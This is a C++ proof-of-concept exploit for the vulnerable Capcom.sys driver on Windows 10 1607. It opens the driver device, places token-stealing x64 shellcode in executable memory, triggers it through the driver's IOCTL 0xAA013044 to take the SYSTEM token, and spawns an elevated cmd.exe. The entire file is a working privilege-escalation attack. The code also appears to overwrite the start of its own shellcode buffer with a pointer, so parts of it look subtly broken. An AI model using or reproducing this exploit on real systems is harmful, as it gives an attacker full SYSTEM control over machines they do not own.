#include <windows.h>
#include <iostream>

#define DEVICE_NAME "\\\\.\\Htsysm72FB"
#define CAPCOM_VULNERABLE_IOCTL 0xAA013044

void spawnElevatedCmd() {

	std::cout << "[+] Spawning new CMD prompt with swapped SYSTEM token\n\n";
	
	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInformation;
	
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	ZeroMemory(&ProcessInformation, sizeof(ProcessInformation));

	int aCreated = CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,NULL,NULL,0,NULL,NULL,NULL,&StartupInfo, &ProcessInformation);

	if (aCreated == 0) {
		std::cout << "[!] Failed to spawn new CMD prompt with swapped SYSTEM token\n";
	}

	WaitForSingleObject(ProcessInformation.hProcess, INFINITE);
	CloseHandle(ProcessInformation.hProcess);
	CloseHandle(ProcessInformation.hThread);
}

int main() {

	std::cout << "\nCapcom.sys rootkit Windows 10 1607 EOP Proof-of-concept\n\n";

	HANDLE hDevice = CreateFileA(DEVICE_NAME , GENERIC_READ | GENERIC_WRITE , FILE_SHARE_READ | FILE_SHARE_WRITE , NULL,
		OPEN_EXISTING , FILE_FLAG_OVERLAPPED | FILE_ATTRIBUTE_NORMAL , NULL);

	if (hDevice == INVALID_HANDLE_VALUE) {
		std::cout << "[!] Failed to initialize the handle for our device - " << GetLastError() << std::endl;
	}
	else {
		std::cout << "[+] Success in initializing the handle for our device - " << DEVICE_NAME << std::endl;
	}

	BYTE tokenStealingShellcode[] = { 0x65, 0x48, 0x8B, 0x14, 0x25, 0x88, 0x01, 
									  0x00, 0x00,
									  0x4C, 0x8B, 0x82, 0xB8, 0x00, 0x00, 0x00,
									  0x4D, 0x8B, 0x88, 0xF0, 0x02, 0x00, 0x00,
									  0x49, 0x8B, 0x09,
									  0x48, 0x8B, 0x51, 0xF8,
									  0x48, 0x83, 0xFA, 0x04,
									  0x74, 0x05, 
									  0x48, 0x8B, 0x09,
									  0xEB, 0xF1,
									  0x48, 0x8B, 0x41, 0x68,
									  0x24, 0xF0,
									  0x49, 0x89, 0x80, 0x58, 0x03, 0x00, 0x00,
									  0x48, 0x83, 0xC4, 0x40,
									  0x48, 0x31, 0xF6,
									  0x48, 0x31, 0xC0, 
									  0xC3 };

	PBYTE inputBuffer = (PBYTE)VirtualAlloc(0, sizeof(tokenStealingShellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (inputBuffer == NULL) {
		std::cout << "[!] Failed to allocate usermode buffer for shellcode\n";
	}

	memcpy(inputBuffer, tokenStealingShellcode, sizeof(tokenStealingShellcode));
	
	std::cout << "[>] Shellcode allocated at @ 0x" << inputBuffer << std::endl;

	std::cout << "[>] Welcome to capcom, on Windows 10, we disable SMEP for your\n";
	std::cout << "[>] Preparing ROP to bypass SMEP... nevermind that's already been handled\n";

	*(PULONG_PTR)inputBuffer = (ULONG_PTR)(inputBuffer + 8);
	ULONG_PTR finalBuffer = (ULONG_PTR)(inputBuffer + 8);

	DWORD sizeReturn = 0;
	DWORD outputBuffer = 0;

	int deviceCom = DeviceIoControl(hDevice, CAPCOM_VULNERABLE_IOCTL, &finalBuffer,
		8, &outputBuffer, 4, &sizeReturn, NULL);

	std::cout << "[+] Shellcode payload (inputBuffer) size - " << sizeof(inputBuffer) << std::endl;
	std::cout << "[+] outputBuffer size needs to be set to 4\n";

	if (deviceCom) {
		spawnElevatedCmd();
	}
	else {
		std::cout << "[!] Failed to send payload to the device driver\n";
	}


	return 0;
}
